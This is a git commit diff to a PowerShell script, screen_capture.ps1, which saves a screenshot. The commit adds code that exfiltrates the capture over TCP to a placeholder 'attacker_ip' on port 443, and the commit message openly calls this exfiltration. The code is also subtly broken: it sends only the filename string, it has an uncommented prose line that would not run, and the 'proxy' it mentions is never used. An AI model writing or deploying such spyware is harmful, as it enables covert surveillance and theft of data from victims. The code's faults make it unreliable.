ee6543e285595caa3da272f1341ea040f5b1874b
etbolt <cou234@proton.me>
2026-08-23 22:23:30 +0100

    Implement screen capture exfiltration over TCP
    Added functionality to exfiltrate the screen capture over a proxy.

--- screen_capture.ps1
+++ screen_capture.ps1
@@ -4,3 +4,12 @@ $graphics = [System.Drawing.Graphics]::FromImage($screen)
 $graphics.CopyFromScreen(0, 0, 0, 0, $screen.Size)
 $screen.Save("C:\screen_capture.png", [System.Drawing.Imaging.ImageFormat]::Png)
 Exfiltrate the screen capture over a proxy
+
+$ip = "attacker_ip"
+$port = 443
+$client = New-Object System.Net.Sockets.TcpClient($ip, $port)
+$stream = $client.GetStream()
+$writer = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::ASCII)
+$writer.Write("screen_capture.png")
+$writer.Flush()
+$client.Close()
